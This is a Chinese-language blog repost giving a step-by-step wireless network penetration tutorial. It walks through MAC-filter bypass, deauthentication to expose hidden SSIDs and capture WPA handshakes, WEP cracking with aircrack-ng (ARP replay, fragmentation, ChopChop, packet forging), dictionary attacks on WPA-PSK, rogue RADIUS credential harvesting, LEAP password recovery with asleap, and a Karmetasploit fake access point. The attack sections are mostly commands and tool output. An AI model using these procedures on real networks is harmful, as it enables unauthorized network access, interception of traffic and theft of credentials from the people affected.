# 无线网络渗透之旅 - =朝晖= - 博客园
# [无线网络渗透之旅](https://www.cnblogs.com/dhcn/p/8448038.html)
http://www.myhack58.com/Article/html/3/8/2010/26313.htm
[0x00] - 简介
[0x01] - 无线网络安全 
[0x02] - 突破简单防御
[0x02a] - 绕过 MAC 过滤
[0x02b] - 发觉隐藏的 SSID 
[0x02c] - 嗅探空中信息
[0x03] - 破解工具
[0x03a] - Aircrack-ng 套件
[0x03b] - 使用 airdecap-ng 解密数据包 
[0x03c] - 使用 airdecloak-ng 伪装数据包 
[0x03d] - 空中破解 101 
[0x04] - 拥有 WEP 密钥的简单技术（非注入）
[0x04a] - 捕捉方法
[0x04b] - 破解方法
[0x05] - 拥有 WEP 密钥的先进技术（注入方法）
[0x05a] - 监听模式
[0x05b] - 欺骗认证
[0x05c] - ARP 重播攻击 
[0x05d] - 分裂攻击
[0x05e] - Korek ChopChop 攻击 
[0x05f] - 数据包伪造
[0x05g] - 交互式 ARP 重播攻击 
[0x05h] - 破解 WEP 密钥
[0x06] - 破解 WEP 的总结脚本
[0x07] - 拥有 WPA-PSK/WPA2-PSK 密钥
[0x08] - 无线网企业漏洞利用(WPA-TLS/TTLS/PEAP) 
[0x09] - CISCO LEAP 漏洞利用
[0x10] - Karmetasploit 大规模利用 
[0x11] - 旅程的尾声
[0x00] - 简介
我曾经在博客内写过了关于无线网驾车作战的技术信息。在本文将详细介绍实用的 HACK 技术来打破无线安全。建议读者应具备无线网基础知识及无线操作。
本文包含 12 个章节，但实际内容是在 10 个章节中，从 0x02 到 0x10。在 0x02 中，我们讨论无线网络的基本攻 
击。章节 0x03 的内容是有关使用的工具。在第 0x04、0x05 和 0x06 章节中，我们提供信息以破解 WEP。章节 0x07、 
0x08 和 0x09 是破解 WPA 和 WPA2 的细节。章节 0x10 是关于 Metasploit 在使用无线网络通过 Rogue AP 的细节。
[0x01] - 无线网络安全
相对于有线网络，无线网络有严重的缺点，因为它使用天空作为媒介。因此，黑客有能力通过中间人或其他方法进行攻击。
因此，无线的安全问题直至现在都十分关注，按照无线网络的安全标准可划分为：
- WEP 
- WPA-PSK 
- WPA2-PSK 
- WPA-802.1x 
- WPA2-802.1x
WEP 是原始安全标准的无线网络，但它很容易破解。WPA 和 WPA2 是主动提供无线安全，解决安全漏洞的 WEP。WPA 和 WPA2 仍划分共享密钥和 802.1x，用于个人和企业。除了这些标准外，还有其他的机制，以加强无线安全，如隐藏的 SSID、MAC 过滤。我们将在此文档中谈论 Hack 这些安全标准机制，也提供其他攻击方法。
[0x02] - 突破简单防御
[0x02a] - 绕过 Mac 过滤
在接入点中存储合法的客户端 MAC 地址是一个基本的安全机制。当有认证请求接入点，接入点将进行比较 MAC 地址贮存器中的 MAC 地址请求。如果结果是匹配的，将验证成功，否则失败。然而，这种方法很容易绕过，攻击者只需改变 MAC 地址的一些命令即可。
我们有一个案例研究绕过 MAC 过滤攻击。有一天，我们为一家公司做无线网络渗透测试。首先，我们使用 kismet 发觉围绕公司的接入点。这让我们知道每一个接入点的确切位置。然后，我们使用 airodump-ng 固定渠道捕捉数据包。airodump-ng 确定目标渠道可以提高效率。我们知道来自 airodump-ng 接入点使用开放式身份验证，它不使用任何加密。因此，我们尝试连接到接入点，但拒绝我们的认证请求。我们得出这样的结论：这个网络使用 MAC 过滤。从 airodump-ng 可以看到，有客户交往接入点。我们立即改变我们的 MAC 地址，是一样相关的客户端并尝试再次连接。在这个时候，一切都很好。我们可以连接到接入点。此外，我们能够获得内部网络并对内部服务器运行任何工具，如 nmap、nessus、exploit。这是非常危险的。
[0x02b] - 发觉隐藏的 SSID 
一些环境中，无线管理员配置隐藏的 SSID。因此，攻击者不能知道网络 SSID 也无法连接到该网络。在 airodump 中，它显示<lenght ?> 哪个数字是 SSID 长度。
只有这样才能知道会话请求的 SSID 名称。在这个数据包传输时，就会发生一个合法的客户端连接到网络。
我们能够影响合法客户端并重新发送验证数据包连接接入点，客户端通过使用 aireplay-ng。该命令像这样：
#aireplay-ng -0 1 -a xx:xx:xx:xx:xx:xx -c zz:zz:zz:zz:zz:zz rausb0 
21:56:47    Waiting for beacon frame (BSSID: xx:xx:xx:xx:xx:xx) on channel 11 
21:56:47    Sending 64 directed DeAuth. STMAC: [zz:zz:zz:zz:zz:zz] [ 0| 0 ACKs] 
发送验证数据包到客户端后，客户端会重新验证并重新会话。
Airodump-ng 可以检测这一进程，并知道这个网络的 SSID。
[0x02c] - 嗅探空中信息
这个主题不使用任何技术或深层知识。许多无线网络使用非公开验证加密机制。攻击者只需要从空中监听并找到像 http、telnet、ftp etc 会话的可信信息数据包。
我们能够使用 airodump-ng 嗅探出其他数据。
[0x03] - 破解工具
我建议使用 Aircrack-NG，Aircrack-NG 是一个一次抓获足够的数据包进行破解 802.11 WEP 和 WPA-PSK 密钥。
它实现了标准的 FMS 攻击和一些最佳化 KoreK 攻击，以及全新的 PTW 攻击，从而相比其他 WEP 破解工具攻击快得多。事实上，Aircrack-ng 是一套审计无线网络的工具。
[0x03a] - Aircrack-ng 套件
在本教程，有四个工具在 aircrack-ng 套件中发挥着重要作用。
- airodump-ng: 用于捕捉数据包
使用 airodump-ng 首先每次打开监听模式，这使我们的网卡在首选的渠道具有注入能力。- aireplay-ng: 用于注入
o de-authentication: 用于发送验证数据包到客户端o fake authentication: 用于执行伪造进程
o interactive packet replay: 用于选择首选的数据包进行重播攻击o arp replay: 用于执行 ARP 协议自动重播攻击
o Korek chopchop: 使用 Chopchop 技术生成密钥o fragment: 使用片段技术生成密钥
- packetforge-ng: 用于创建数据包 
- aircrack-ng: 用于恢复密钥
更多详情：http://aircrack-ng.org/doku.php#aircrack-ng_suite1 
[0x03b] - 使用 airdecap-ng 解密数据包
之后，我们得到 WEP 或 WPA 密钥，有时候我们要破译捕获的数据包。Aircrack 团队已经提供给我们工具。它是“airdecap-ng”。例子中的使用过程像这样：
#airdecap-ng -b xx:xx:xx:xx:xx:xx workshop-01.cap 或 #airdecap-ng -e Workshop workshop-02.cap 
主意：对于 WPA，airdecap-ng 只有文件包含四次握手才能返回成功的结果。
[0x03c] - 使用 airdecloak-ng 伪装数据包
伪装是一种扰乱破坏 WEP 密钥进程的技术。这种技术是通过加密的随机 WEP 密钥的网络注入数据包，这些数据包成为“chaff”。如果攻击者捕获这些数据包并进行破解破解，返回的结果是错误的或其他的结果。然而，aircrack 团队开发了一个工具来处理此技术，它被称为“airdecloak-ng”。
#airdecloak-ng --bssid xx:xx:xx:xx:xx:xx -i workshop-01.cap 
此命令返回两个文件：
- workshop-01-filtered.cap: 来自包含过滤包的特定接入点
- workshop-01-cloaked.cap: 来自包含加密数据包的特定接入点
[0x03d] - 空中破解 101 
PTW 攻击 (-z) 
(aircrack-ng -z capture.cap), 只有 WEP 64/128 位工作，需要 ARP 请求/重播数据包，你必须从 airodump-ng 转储所有数据包。
字典攻击 Attack (WPA/WPA2 语法) 
(aircrack-ng -w pass.lst *.cap) 
修改攻击 (-f) 
一旦达到 2 millions IVs, 尝试修改“-f 4”。重试，每次增加 4。** 与此同时，不断收集数据。
[0x04] - 拥有 WEP 密钥的简单技术（非注入）
有几种方法法破解 WEP 密钥。
首先，我们应该准备支持监听模式的设备，可以注入到网络的数据包。之后，我们准备破解工具，我选择使用 aircrack-ng 
其主要思想是，收集大量加密的数据包，然后我们可以使用这些包破解 WEP 密钥。因此，有两种情况：
1. 该网络是高流量
2. 该网络是低流量
有什么不同呢？
当然，第一种情况下，我们只使用 airodump 收集的数据包和破解的密钥，但第二种情况下，我们要注入的数据包，以获取更多的数据包。我们为你介绍第一种，捕获和破解方法。然后我们谈论注入方法，只能使用于较弱的交换网络。
[0x04a] - 捕捉方法
首先，收集数据包。64 位的 WEP 密钥，我们使用约 50000 个数据包和约 150,000 个 128 位的 WEP 密钥数据包。收集数据包的命令是
#airodump-ng -w workshop rausb0 
[ CH 11 ][ Elapsed: 16 mins ][ 2009-02-23 21:21 ][ Decloak: xx:xx:xx:xx:xx:xx 
BSSID                                PWR RXQ    Beacons        #Data, #/s    CH    MB    ENC    CIPHER AUTH ESSID
xx:xx:xx:xx:xx:xx                     77     94          10905           11054           0     11     54. WEP    WEP       OPN    Workshop
BSSID                                STATION                           PWR      Rate    Lost    Packets    Probes
xx:xx:xx:xx:xx:xx    yy:yy:yy:yy:yy:yy                                  85     54-54              0           7747
我们以后破解密钥会用到这个 “workshop-01.cap” 文件。
我们可以在数据字段中确定有多少个数据包，大约 90%的数据包中的数据显示领域是我们需要的 IV 数据包。
[0x04b] - 破解方法
在我们收集足够的加密数据包之后，我们使用 aircrack-ng 恢复密钥。#aircrack-ng -b xx:xx:xx:xx:xx:xx workshop-01.cap 
-b xx:xx:xx:xx:xx:xx 目标接入点 MAC 地址 
成功破解的结果如下所示所示：
Opening workshop-01.cap 
Attack will be restarted every 5000 captured ivs. Starting PTW attack with 50417 ivs. 
KEY FOUND! [ 00:11:22:33:44 ] 
Decrypted correctly: 100%
[0x05] - 拥有 WEP 密钥的先进技术（注入方法）
这种方法没有必要在高流量的网络，但它是非常重要的低交换网络。我们必须注入数据包到接入点中，以产生新的数据包返回到客户端。
如果我们仔细考虑上面的方法，源 MAC 地址必须是相关联的，必需的数据包发送到用户端的接入点并且数据包必会引起接入点产生反应或其他包；通常我们应该针对 MAC 地址播送数据包。
我们可以得出选择数据包注入的必要条件的结论如下所示：
- MAC 地址关联到接入点 （可以通过伪装身份验证做到这一点）- 发送到用户端的接入点 （“To DS”标记设置为 1） 
- 目标 MAC 地址是广播 （FF:FF:FF:FF:FF:FF）
数据包使用于所有要求 ARP 请求的广播。在 aircrack-ng 中，有 aireplay-ng 有一个选项，执行 ARP 重播攻击。这次攻击是为了捕捉 ARP 请求，然后重放它的接入点，以创建新的数据包。但是，如果在那个时候该网络没有 ARP 请求广播。现在，我们可以划分注入技术的 2 个场景。
- 网络有 ARP 请求。
- 网络没有 ARP 请求。
无论哪种情况下，我们必须执行注入相关 MAC 地址。现在，我们有两个选择。第一是改变我们的 MAC 地址，第二是做欺骗认证。
[0x05a] - 监听模式
使用 airmon-ng 设置您的 wifi 监听模式，并准备注入数据包。#airmon-ng start wlan0 11 
设置 wlan0 监听模式信道 11，我们必须指定相同的信道为目标 AP 信道。
[0x05b] - 欺骗认证
我们可以做的欺骗认证命令如下所示所示：
#aireplay-ng -1 0 -a xx:xx:xx:xx:xx:xx -h yy:yy:yy:yy:yy:yy rausb0 
-a xx:xx:xx:xx:xx:xx 接入点 MAC 地址
-h yy:yy:yy:yy:yy:yy 无线网卡 MAC 地址
如果我们成功获得结果，我们的 MAC 地址将联系特定的接入点。
成功的结果如下所示：
00:00:00    Sending Authentication Request 
00:00:00    Authentication successful 
00:00:00    Sending Association Request 
00:00:00    Association successful :-) 
欺骗认证成功后，我们必须确定哪种类型的网络，我们正面临着选择适当的步骤来处理。
[0x05c] - ARP 重播攻击
我们可以使用 ARP 重播攻击的命令如下所示：
#aireplay-ng -3 -b xx:xx:xx:xx:xx:xx -h yy:yy:yy:yy:yy:yy rausb0 
-b xx:xx:xx:xx:xx:xx 接入点 MAC 地址
-h yy:yy:yy:yy:yy:yy 我们的无线网卡 MAC 地址
Aireplay-ng 可侦测 ARP 请求，并用它来自动进行重播攻击。发现的 ARP 请求，信息如下所示：
21:06:20    Waiting for beacon frame (BSSID: xx:xx:xx:xx:xx:xx) on channel 11 Saving ARP requests in replay_arp-0223-210620.cap 
You should also start airodump-ng to capture replies. 
Read 1379 packets (got 30 ARP requests and 0 ACKs), sent 3468 packets...(499 pps) 
** 在某些情况下，没有任何由 ARP 请求播出的接入点。所以，我们不能正常使用 ARP 重播攻击。
我们必须从生成密钥流捕获的数据包，并使用密钥流伪造 ARP 请求数据包，然后重放，以接入点创建新的数据包。有两种方法用于生成密钥流，分为“chopchop 攻击”和“碎片攻击”。
这两种方法可以用 aireplay-ng 执行。
[0x05d] - 分裂攻击
碎片攻击是用来生成大小为 1500 字节的密钥流。因此，我们可以使用这个密钥流创建一个数据包，它的大小可达到 1500 字节。该碎片攻击命令为：
#aireplay-ng -5 -b xx:xx:xx:xx:xx:xx -h yy:yy:yy:yy:yy:yy rausb0
该系统的响应结果如下所示：
21:21:07    Waiting for beacon frame (BSSID: 00:1B:2F:3D:CB:D6) on channel 11 21:21:07    Waiting for a data packet... 
Size: 90, FromDS: 1, ToDS: 0 (WEP) 
BSSID     =   00:1B:2F:3D:CB:D6
Dest. MAC       =   00:1A:73:37:E2:A3
Source MAC      =   00:1B:2F:3D:CB:D6
0x0000:   8842 2c00 001a 7337 e2a3 001b 2f3d cbd6                   .B,...s7..../=..
0x0010:   001b 2f3d cbd6 20df 0000 b168 ff00 2872       ../=.. ....h..(r
0x0020:   7547 d03f 70d7 2d29 1397 7d3d ac16 382a    uG.?p.-)..}=..8*
0x0030:    f20f 77fb ca63 13e0 f7a6 9228 ddc0 8263 ..w..c.....(...c
0x0040:   5315 a328 87cb 0d4a b36a e5be 93c7 307a    S..(...J.j....0z
0x0050:   7bc2 18d7 2df5 94f2 5aed                      {...-...Z.
Use this packet ? 
我们必须回应“y”。
Use this packet ? y 
成功过程如下所示：
Saving chosen packet in replay_src-0223-212107.cap Data packet found! 
Sending fragmented packet 
Got RELAYED packet!! 
Thats our ARP packet! 
Trying to get 384 bytes of a keystream 
Got RELAYED packet!! 
Thats our ARP packet! 
Trying to get 1500 bytes of a keystream 
Got RELAYED packet!! 
Thats our ARP packet! 
Saving keystream in fragment-0223-212107.xor 
Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
[0x05e] - Korek ChopChop 攻击
有一个家伙 KoreK 开发了一个棘手的攻击方法，称为 ChopChop。它要求只有一个加密的数据包用来解密获取的密钥流，然后使用密钥流生成 ARP 请求数据包，并最终执行 ARP 协议重播攻击。
我们使用 ChopChop 攻击，可以键入如下所示命令：
#aireplay-ng -4 -b xx:xx:xx:xx:xx:xx -h yy:yy:yy:yy:yy:yy rausb0 Aireplay-ng 将挑选一个数据包进行解密。
响应如下所示：
21:12:42    Waiting for beacon frame (BSSID: 00:1B:2F:3D:CB:D6) on channel 11 
Size: 90, FromDS: 1, ToDS: 0 (WEP) 
BSSID     =   00:1B:2F:3D:CB:D6
Dest. MAC       =   00:1A:73:37:E2:A3
Source MAC      =   00:1B:2F:3D:CB:D6
0x0000:   8842 2c00 001a 7337 e2a3 001b 2f3d cbd6                   .B,...s7..../=..
0x0010:   001b 2f3d cbd6 6084 0000 55bc e600 2e4e                   ../=..`...U....N
0x0020:    a334 a2b3 fc4c fe8a 2cf4 f548 0f27 90d0     .4...L..,..H.'..
0x0030:   767d 2725 bedd 62ec 252e 8b4b d2d3 a8a0    v}'%..b.%..K...
0x0040:    bb3f 4874 c821 c402 467d f70f 2a56 43a7   .?Ht.!..F}..*VC.
0x0050:    b09b f0f1 8b04 fc1c 0b72.............................. ...r
Use this packet ? 
我们仍然键入“y”。
Use this packet ? y 
然后系统进行解密。
Saving chosen packet in replay_src-0223-211242.cap
Offset       87 ( 3% done) | xor = 4E | pt = 3C |
Offset       86 ( 5% done) | xor = 16 | pt = 1D |
Offset       85 ( 7% done) | xor = 63 | pt = 7F |
Offset       84 ( 8% done) | xor = 97 | pt = 6B |
Offset       83 (10% done) | xor = 0E | pt = 0A |
Offset       82 (12% done) | xor = 86 | pt = 0D |
64 frames written in 1097ms
119 frames written in 2029ms
146 frames written in 2476ms
239 frames written in 4068ms
228 frames written in 3865ms
273 frames written in 4646ms
Offset       81 (14%    done) |   xor = C9 | pt    = 38 |      2 frames written     in        35ms
Offset       80 (16%    done) |   xor = C4 | pt    = 34 |   185    frames written     in    3145ms
Offset       79 (17%    done) |   xor = BB | pt    = 20 |   250    frames written     in    4253ms
Offset       78 (19%    done) |   xor = F7   | pt    = 47   |      97   frames written     in    1649ms
Offset       77 (21%    done) |   xor = E9 | pt    = 4E | 247    frames written     in    4196ms
Offset       76 (23%    done) |   xor = 12   | pt    = 51 |   237    frames written     in    4029ms
Offset       75 (25%    done) |   xor = 56   | pt    = 00   |      52   frames written     in      884ms
Offset       74 (26%    done) |   xor = 2A | pt    = 00 |   431    frames written     in    7326ms
Offset       73 (28%    done) |   xor = 7E | pt    = 71 |   232    frames written     in    3946ms
Offset       72 (30%    done) |   xor = 1C | pt    = EB | 123    frames written     in    2093ms
Offset       71 (32%    done) |   xor = B6 | pt    = CB |     9 frames written     in      141ms
Offset       70 (33%    done) |   xor = BC    | pt    = FA | 256    frames written     in    4365ms
Offset       69 (35%    done) |   xor = 1A | pt    = 18 |   179    frames written     in    3041ms
Offset       68 (37%    done) |   xor = 94   | pt    = 50 |   118    frames written     in    2002ms
Offset       67 (39%    done) |   xor = 50   | pt    = 71 |    65   frames written     in    1109ms
Offset       66 (41%    done) |   xor = 9D | pt    = 55 |   172    frames written     in    2921ms
Offset       65 (42%    done) |   xor = 3C | pt    = 48   |    196    frames written     in    3338ms
Offset       64 (44%    done) |   xor = BE | pt    = F6 | 281    frames written     in    4763ms
Offset       63 (46%    done) |   xor = 81   | pt    = BE |   61   frames written     in    1051ms
Offset       62 (48%    done) |   xor = AC    | pt    = 17   |    456    frames written     in    7748ms
Offset       61 (50%    done) |   xor = D2 | pt    = 72 |    73   frames written     in    1231ms
Offset       60 (51%    done) |   xor = 9C | pt    = 34 |   428    frames written     in    7288ms
Offset       59 (53%    done) |   xor = 64   | pt    = B7 | 120    frames written     in    2036ms
Offset       58 (55%    done) |   xor = 87   | pt    = 55 |   188    frames written     in    3200ms
Offset       57 (57%    done) |   xor = 0C | pt    = 47 |   119    frames written     in    2024ms
Offset       56 (58%    done) |   xor = 8C | pt    = 07 |   124    frames written     in    2095ms
Offset       55 (60%    done) |   xor = 2C   | pt    = 02   |    364    frames written     in    6197ms
Offset       54 (62%    done) |   xor = 25   | pt    = 00 |   136    frames written     in    2315ms
Offset       53 (64%    done) |   xor = 44   | pt    = A8 | 142    frames written     in    2410ms
Offset       52 (66%    done) |   xor = A2 | pt    = C0   |    102    frames written     in    1733ms
Offset       51 (67%    done) |   xor = C9 | pt    = 14 |    19   frames written     in      329ms
Offset       50 (69%    done) |   xor = D5 | pt    = 6B | 183    frames written     in    3110ms
Offset       49 (71%    done) |   xor = 0B | pt    = 2E |    62   frames written     in    1048ms
Offset       48 (73%    done) |   xor = E8 | pt    = CF |   18   frames written     in      306ms
Offset       47 (75%    done) |   xor = FB | pt    = 86 |    29   frames written     in      496ms
Offset       46 (76%    done) |   xor = 4B | pt    = 3D | 100    frames written     in    1702ms
Offset       45 (78%    done) |   xor = D6 | pt    = 06 |    77   frames written     in    1312ms
Offset       44 (80%    done) |   xor = FD   | pt    = 6D | 226    frames written     in    3828ms
Offset       43 (82%    done) |   xor = 27   | pt    = 00 |   117    frames written     in    2001ms
Offset       42 (83%    done) |   xor = 4F   | pt    = 40   |      38   frames written     in      641ms
Offset       41 (85%    done) |   xor = 1C | pt    = 54 |   354    frames written     in    6020ms
Offset       40 (87%    done) |   xor = 20   | pt    = D5 | 277    frames written     in    4714ms
Offset       39 (89%    done) |   xor = C4 | pt    = 30   |    113    frames written     in    1918ms
Offset       38 (91%    done) |   xor = 2C | pt    = 00 |   485    frames written     in    8244ms
Offset       37 (92%    done) |   xor = 8A | pt    = 00 |   231    frames written     in    3933ms
The AP appears to drop packets shorter than 37 bytes. 
Enabling standard workaround:    IP header re-creation.
This doesn't look like an IP packet, try another one. 
Warning: ICV checksum verification FAILED! Trying workaround. 
The AP appears to drop packets shorter than 40 bytes. 
Enabling standard workaround:    IP header re-creation. 
Saving plaintext in replay_dec-0223-211410.cap 
Saving keystream in replay_dec-0223-211410.xor 
Completed in 21s (2.48 bytes/s) 
这一过程由 xor 文件和 cap 文件产生。xor 文件包含密钥流；cap 文件包含解密数据包。
[0x05f] - 数据包伪造
创建加密的数据包形式 PRGA(XOR)从 ChopChop 或碎片得到。
#Packetforge-ng -0      - a xx:xx:xx:xx:xx:xx - h yy:yy:yy:yy:yy:yy - k
255.255.255.255 -y replay_dec-0223-211410.xor -w arp
其结果是：
Wrote packet t arp
从这个命令中，我们得到 ARP 请求数据包中的文件名为“arp”。
[0x05g] - 交互式 ARP 重播攻击
我们使用 aireplay 注入 ARP 请求数据包到接入点。通过输入下面的命令。
#aireplay-ng -2 -r arp rausb0
响应将如下所示所示：
Size: 68, FromDS: 0, ToDS: 1 (WEP)
BSSID     =     00:1B:2F:3D:CB:D6
Dest. MAC       =    FF:FF:FF:FF:FF:FF
Source MAC      =     00:21:27:C0:07:71
0x0000: 0841 0201 001b 2f3d cbd6 0021 27c0 0771 .A..../=...!'..q
255.255.255.255 - l
0x0010:    ffff ffff ffff 8001 55bc e600 2e4e a334........... ..U....N.4
0x0020:    a2b3 fc4a bb8b 24c4 2618 4f26 fdf7 6c3b ...J..$.&.O&..l;
0x0030:    ef7a 2a36 5dbb 252c 8c0c 8764 632d 537e          .z*6].%,...dc-S~
0x0040:   66bf 700e                                                   f.p.
Use this packet ? 
我们回应“y”。
Use this packet ? y 
aireplay-ng 开始注入数据包。
Saving chosen packet in replay_src-0223-211755.cap 
You should also start airodump-ng to capture replies. 
Sent 1200 packets...(499 pps) 
[0x05h] - 破解 WEP 密钥
在我们收集足够的加密包之后，我们使用 aircrack-ng 来恢复密钥。 
       #aircrack-ng -z capture1.cap (PTW Attack) 
成功地破解结果如下所示：
Opening capture1.cap 
Attack will be restarted every 5000 captured ivs. Starting PTW attack with 50417 ivs. 
KEY FOUND! [ 00:11:22:33:44 ] 
Decrypted correctly: 100% 
[0x06] - 破解 WEP 的总结脚本
Note: $AP 是接入点的 MAC 地址
$WIFI 是 WIFI 网卡的 MAC 地址
- airmon-ng start wlan0 11 （监控模式必须确定具体频道）- airodump-ng -c 11 -w capture1.cap wlan0
- aireplay-ng -1 0 -e linksys -a $AP -h $WIFI wlan0 - aireplay-ng -4 -b $AP -h $WIFI wlan0 
If Not Work!! Try #aireplay-ng -5 -b $AP -h $WIFI wlan0 
- packetforge-ng -0 -a $AP -h $WIFI -k 255.255.255.0 -l 255.255.255.0 -y replay_dec-03.xor -w arp-request 
- aireplay-ng -2 -r arp-request wlan0 
- aircrack-ng -z capture1.cap 
** 这些方法可用于客户端的 WEP 破解。
[0x07] - 拥有 WPA-PSK/WPA2-PSK 密钥
PSK 代表 Pre-Shared 密钥。这些机制的改善从而解决了 WEP 的脆弱性。
因此，它能够使用相同的破解 WEP 方式来破解密钥。只有这样，才能恢复 WPA-PSK 或 WPA2-PSK，也就是说获取4 次握手并利用字典攻击的破解。
这个主意破解 Pre-shared 密钥是收集四次握手包。我们能够做到这一点，去验证相关的客户端。这种方式将迫使客户端进行重新验证，我们可以在这个进程中进行四次握手。验证命令如下所示：#aireplay-ng -0 1 -a xx:xx:xx:xx:xx:xx -c zz:zz:zz:zz:zz:zz rausb0 
21:56:47    Waiting for beacon frame (BSSID: xx:xx:xx:xx:xx:xx) on channel 11 
21:56:47    Sending 64 directed DeAuth. STMAC: [zz:zz:zz:zz:zz:zz] [ 0| 0 ACKs] 
我猜想我们获取了这一进程 workshop.cap 文件。所以，我们使用 aircrack 进行破解。#aircrack-ng -w wordlist --bssid xx:xx:xx:xx:xx:xx workshop-02.cap 
成功的结果如下所示：
Opening test-02.cap 
Read 252 packets. 
#    BSSID                   ESSID                                 Encryption
1    xx:xx:xx:xx:xx:xx    Workshop                          WPA (1 handshake)
Choosing first network as target. 
Opening workshop-02.cap 
Reading packets, please wait...
Aircrack-ng 1.0 rc1 r1085 
[00:00:00] 0 keys tested (0.00 k/s) 
KEY FOUND! [ TheFuckinWPAKey ] 
Master Key            : 3C 57 0F 3A 55 E5 C5 27 8E 93 02 F2 F9 21 2C D4 
E2 48 6C DF 59 8D 19 19 B5 F2 80 BE 81 15 10 63 
Transcient Key : E3 91 AD 02 78 A5 51 DE 2A AE 15 25 DB 9B 4A F6 
61 A7 42 D8 32 9B 48 37 01 80 0B A7 83 F9 67 B2 
9B FE 47 EA 0A B8 E0 2D E0 81 6E BB 48 1F AA 86 
2A 7E B0 F7 BE C8 2B 8F 14 DF AB 6F 58 28 8E E1 
EAPOL HMAC              : EC 94 29 B7 1F 1F 8E F7 25 78 E9 E1 C6 4E 51 3D 
从这个结果中可以看出，它意味着 WPA-PSK/WPA2-PSK 密钥是“TheFuckinWPAKey”。
[0x08] - 无线网企业漏洞利用 (WPA-TLS/TTLS/PEAP) 
大多数公司转向使用公共密钥加密的无线网络，他们认为这是绝对安全的。但是，狡猾的攻击者攻击这一系统仍然是由欺骗证书。
这种攻击方法是一种利用客户端信息。许多客户端接受认证而不考虑它是否是真正的证书或没有证书。这使攻击者冒充自己是 RADIUS 服务器和 Loggin 凭证资料的受害者。
我们可以使用 Freeradius 伪装 Radius 服务器与 WPE 补丁结合，使 Loggin 凭证资料到 Freeradius 服务器。附加说明：http://www.willhackforsushi.com/FreeRADIUS_WPE.html 
[0x09] - CISCO LEAP 漏洞利用
Cisco 专有轻量级扩展身份验证协议（LEAP）无线认证过程有助于消除安全漏洞，基于用户的认证，并能够产生动态的 WEP 密钥。Cisco LEAP 是一个所指定的 802.1X 可扩展身份验证协议（EAP）类型。
LEAP 是易于执行和控制的特性，如：
- 相互身份验证
- 基于用户验证 
- 动态 WEP 密钥
本文转载自：神秘小强' blog QQ交流群:29097418
我们发现用户名是以明文发送到 Radius，但捕获的 Wireshark 密码是加密的，因此，同样容易进行漏洞利用。asleap 是一个工具，用来恢复脆弱的 LEAP 和 PPTP 密码，asleap 可以执行：
- 脆弱的 LEAP 和 PPTP 密码恢复
- Deauthentication 客户端的 WLAN（加快 LEAP 密码恢复）AIRJACK 驱动程序
下载 Asleap http://asleap.sourceforge.net/ 
第一步，使用 asleap 建立必需的资料库（.dat）和索引文件（.idx）
#./genkeys    -r    dict -f    dict.dat    -n    dict.idx
dict = Our wordlist/dictionary file, with one word per line 
dict.dat = Our new output pass+hash file (generated as a result of running this command) 
dict.idx = Our new output index filename (generated as a result of running this command) 
#./genkeys -r dictionary -f dict.dat -n dict.idx 
genkeys 1.4 - generates lookup file for asleap. <jwright@hasborg.com> Generating hashes for passwords (this may take some time) ...Done. 3 hashes written in 0.2 seconds: 122.67 hashes/second 
Starting sort (be patient) ...Done. 
Completed sort in 0 compares. 
Creating index file (almost finished) ...Done. 
最后一个步骤是恢复薄弱的 LEAP 密码，运行 asleap 命令创建新的.dat 和.idx 文件：
#./asleap     -r    data/leap.dump -f    dict.dat    -n    dict.idx
leap.dump = Our libpcap packet capture file (NOTE: Any libpcap (e.g. tcpdump, Wireshark) or AiroPeek capture file (.apc) can be used) 
dict.dat = Our output pass+hash file (generated with genkeys, see above) 
dict.idx = Our new output index filename (generated with genkeys, see above) 
#./asleap -r data/leap.dump -f dict.dat -n dict.idx 
asleap 1.4 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com> Using the passive attack method. 
Captured LEAP exchange information: 
       username:    qa_leap 
challenge:     0786aea0215bc30a
response:      7f6a14f11eeb980fda11bf83a142a8744f00683ad5bc5cb6
hash bytes: 4a39
NT hash:     a1fc198bdbf5833a56fb40cdd1a64a39
password:    qaleap 
Closing pcap ... 
注意：成功率取决于字典大小
现在 ASLEAP 2.2，包含“-C”和“-R”选项来指定十六进制分割字节的挑战与对策。使用此选项，Asleap 成为一个通用的 MS-CHAPv2 破解工具。
[0x10] - Karmetasploit 大规模利用
HD Moore 发布了一些说明信息(http://trac.metasploit.com/wiki/Karmetasploit)获得 karmetasploit 工作的框架。
Karmetasploit 可以发送伪装 AP 并与客户端连接。攻击者可以记录 Cookie、Ftp、Http、认证信息等等。还可以在客户端机器利用浏览器漏洞。
这种方法测试在 Backtrack3（最终）
 http://www.smxiaoqiang.cn/
1. 更新 Aircrack-NG 
$ svn co http://trac.aircrack-ng.org/svn/trunk/ aircrack-ng $ make 
# make install 
2. 让我们测试一下 aireplay-ng 的工作（注入数据包必须支持你的无线网卡） 
       bt# aireplay-ng -9 wlan0 
15:10:21 Trying broadcast probe requests... 15:10:21 Injection is working! 
15:10:25 Found 5 APs 
15:10:25 Trying directed probe requests... 
15:10:26 00:1E:58:33:83:71 - channel: 2 - 'CITEC' 15:10:35 0/30: 0% 
15:10:37 00:14:06:11:42:A2 - channel: 6 - 'WORKSHOP' 15:10:42 0/30: 0% 
15:10:42 00:13:19:5F:D1:D0 - channel: 11 - 'VICTIM' 
15:10:48 Ping (min/avg/max): 3.325ms/126.125ms/201.281ms Power: 83.27 15:10:48 5/30: 60% 
15:10:48 Injection is working!
15:56:48 00:14:06:11:42:A0 - channel: 11 - 'Mywifi' 15:56:53 0/30: 0% 
现在它在进行注入工作！
3. 更新 Metasploit 
$ svn co http://metasploit.com/svn/framework3/trunk msf3 
4. 下载 Bash 脚本 http://www.darkoperator.com/kmsapng.tgz 
该脚本执行以下操作：
- 改变 MAC 地址的接口 
- 设置监听模式的接口
- 启动 Airbase-ng 的 Karma AP 
- 更改 MTU 接口大小
- 设置 IP 地址
- 启动 DHCPD 服务器
- 设置 iptables 重定向 
- 启动 Metasploit 
6. 然后我们运行 kmsapng.sh，像这样：
#./kmsapng.sh -i wlan0 -m km -s linksys 
Changing MAC Address 
Current MAC: 00:0f:c1:08:12:91 (Wave Corporation) 
Faked MAC:         00:40:1b:5b:b0:0b (Printer Systems Corp.) 
starting fake ap 
This will take 15 seconds ... 
DHCPD started successfully 
Starting Packet capture to /root/kms.cap 
Starting Metasploit 
_ 
| |         o
_   _   _      _ _|_   __,    ,       _   | | __      _|_
/ |/ |/ |       |/   |    /    |                    / \_|/ \_|/     /      \_|   |
|    |    |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
/| 
\| 
=[ msf v3.2-release 
+ -- --=[ 304 exploits - 124 payloads 
